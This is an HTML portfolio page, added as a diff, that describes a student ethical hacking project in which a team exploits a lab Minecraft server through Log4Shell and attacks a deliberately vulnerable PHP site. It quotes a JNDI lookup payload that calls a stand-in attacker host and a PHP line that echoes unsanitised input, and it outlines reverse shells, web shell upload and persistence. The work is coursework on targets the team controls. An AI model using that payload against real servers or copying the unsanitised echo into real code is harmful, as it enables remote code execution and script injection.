@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Ethical Hacking Project</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1" />
+
+    <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../../default.css">
+
+    <style type="text/css">
+        .img-container {
+            max-width: 600px;
+        }
+
+        img {
+            width: 100%;
+        }
+
+        .attack-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1em;
+            margin: 1.5em 0;
+        }
+
+        .attack-card {
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 1.2em;
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        .attack-card h4 {
+            margin: 0 0 0.5em 0;
+            font-size: 0.95em;
+            color: #ff5252;
+        }
+
+        .attack-card p {
+            margin: 0;
+            font-size: 0.85em;
+            line-height: 1.6;
+        }
+
+        .phase-list {
+            list-style: none;
+            padding: 0;
+            margin: 1.5em 0;
+        }
+
+        .phase-list li {
+            padding: 0.8em 1em;
+            border-left: 3px solid #ff5252;
+            margin-bottom: 0.6em;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 0 6px 6px 0;
+            font-size: 0.88em;
+            line-height: 1.6;
+        }
+
+        .phase-list li strong {
+            display: block;
+            margin-bottom: 0.2em;
+            font-size: 0.95em;
+        }
+
+        code {
+            background: rgba(255, 82, 82, 0.12);
+            padding: 0.15em 0.4em;
+            border-radius: 4px;
+            font-size: 0.88em;
+            font-family: 'Roboto Mono', monospace;
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="nav-wrapper">
+
+        <a href="../../index.html">
+            <div class="dots-wrapper">
+                <div id="dot-1" class="browser-dot"></div>
+                <div id="dot-2" class="browser-dot"></div>
+                <div id="dot-3" class="browser-dot"></div>
+            </div>
+        </a>
+
+    </div>
+
+    <div class="main-container">
+
+        <h3>Ethical Hacking</h3>
+        <p><em>IT2212 — Penetration Testing &amp; Exploitation on Vulnerable Targets</em></p>
+
+        <!-- ───── Overview ───── -->
+        <h4>Overview</h4>
+        <p>
+            A group project where we built a deliberately vulnerable web application and a Minecraft server environment,
+            then performed real penetration tests against them. The goal was to walk through the full ethical hacking
+            lifecycle — reconnaissance, exploitation, and post-exploitation — on targets we controlled, demonstrating
+            how common vulnerabilities are discovered and abused in the real world.
+        </p>
+        <p>
+            The project had two main attack surfaces: a PHP web application riddled with security flaws, and a
+            Minecraft Java Edition server vulnerable to the infamous Log4J (Log4Shell) exploit. We used industry
+            tools like Burp Suite, Metasploit, and custom payloads to compromise both targets and establish
+            backdoor access.
+        </p>
+
+        <!-- ───── Minecraft / Log4J ───── -->
+        <h4>Minecraft &amp; Log4J (CVE-2021-44228)</h4>
+        <p>
+            The highlight of the project was exploiting a Minecraft server through the Log4Shell vulnerability.
+            Minecraft Java Edition uses Apache Log4j for logging, and any chat message typed by a player gets
+            processed by the logging library. By sending a crafted JNDI lookup string in the in-game chat, we
+            triggered the server to reach out to our attacker-controlled LDAP server, which served a malicious
+            Java class — giving us remote code execution on the target machine.
+        </p>
+
+        <ul class="phase-list">
+            <li>
+                <strong>1 &mdash; Setup</strong>
+                Stood up a vulnerable Minecraft server (pre-patch version using Log4j 2.x) on an isolated lab network.
+                Configured an attacker machine with a rogue LDAP server and a reverse shell payload.
+            </li>
+            <li>
+                <strong>2 &mdash; Trigger</strong>
+                Connected to the Minecraft server as a regular player and typed a crafted JNDI lookup string
+                (<code>${jndi:ldap://attacker-ip/exploit}</code>) into the in-game chat. Log4j parsed the
+                message and made an outbound LDAP request to our server.
+            </li>
+            <li>
+                <strong>3 &mdash; Payload Delivery</strong>
+                Our rogue LDAP server responded with a reference to a malicious Java class hosted on a separate
+                HTTP server. The Minecraft server downloaded and executed the class automatically.
+            </li>
+            <li>
+                <strong>4 &mdash; Backdoor Access</strong>
+                The payload opened a reverse shell back to our attacker machine, giving us full command-line
+                access to the server. From there we demonstrated persistence by planting a backdoor that
+                survives server restarts.
+            </li>
+        </ul>
+
+        <!-- ───── Vulnerable Web App ───── -->
+        <h4>Vulnerable Web Application</h4>
+        <p>
+            We also built a PHP web application as a second target — a simple dog breed website with login,
+            registration, and file upload features. The app was intentionally coded with multiple security flaws
+            to serve as a penetration testing playground.
+        </p>
+
+        <div class="attack-grid">
+            <div class="attack-card">
+                <h4>Unrestricted File Upload</h4>
+                <p>
+                    The upload form accepts any file type with no validation — no extension checks, no MIME type
+                    filtering, no size limits. We uploaded a PHP web shell directly through the form and accessed
+                    it via the browser to execute arbitrary commands on the server.
+                </p>
+            </div>
+            <div class="attack-card">
+                <h4>Cross-Site Scripting (XSS)</h4>
+                <p>
+                    The login success page echoes the user's name directly into the HTML with
+                    <code>&lt;?php echo $_POST["name"]; ?&gt;</code> — no sanitisation at all. Injecting a
+                    script tag in the name field executes JavaScript in the victim's browser, enabling session
+                    hijacking or phishing.
+                </p>
+            </div>
+            <div class="attack-card">
+                <h4>Weak Authentication</h4>
+                <p>
+                    The login form sends credentials in plain POST with no parameterised queries, no rate limiting,
+                    and no account lockout. The registration also hashes the password using an uninitialised variable
+                    rather than the actual user input — meaning stored passwords are predictable.
+                </p>
+            </div>
+            <div class="attack-card">
+                <h4>No CSRF Protection</h4>
+                <p>
+                    None of the forms include anti-CSRF tokens. An attacker can craft a malicious page that
+                    auto-submits requests to the application on behalf of a logged-in user — changing passwords,
+                    uploading files, or modifying data without the user's knowledge.
+                </p>
+            </div>
+        </div>
+
+        <!-- ───── Tools Used ───── -->
+        <h4>Tools &amp; Techniques</h4>
+        <ul class="phase-list">
+            <li>
+                <strong>Log4Shell Exploit Chain</strong>
+                Rogue LDAP server + malicious Java class + reverse shell payload to achieve RCE via Minecraft chat
+            </li>
+            <li>
+                <strong>PHP Web Shell</strong>
+                Uploaded through the unrestricted file upload to gain command execution on the web server
+            </li>
+            <li>
+                <strong>Burp Suite</strong>
+                Intercepted and modified HTTP requests to test for XSS, parameter tampering, and authentication bypasses
+            </li>
+            <li>
+                <strong>Netcat / Reverse Shells</strong>
+                Established backdoor connections from compromised targets back to the attacker machine
+            </li>
+        </ul>
+
+        <!-- ───── My Role ───── -->
+        <h4>My Role</h4>
+        <p>
+            I focused on the Minecraft Log4J exploitation — setting up the vulnerable server, configuring the
+            LDAP exploit chain, crafting the reverse shell payload, and demonstrating the full attack path from
+            a simple chat message to remote backdoor access. I also helped identify and document the web
+            application vulnerabilities for the team's penetration testing report.
+        </p>
+
+        <!-- ───── Team ───── -->
+        <h4>Team</h4>
+        <p>Team 9 &nbsp;|&nbsp; IT2212 Ethical Hacking</p>
+        <p><a href="https://github.com/StellaCheng03/IT2212_Team9_Project" target="_blank">View on GitHub &rarr;</a></p>
+
+    </div>
+</body>
+
+</html>
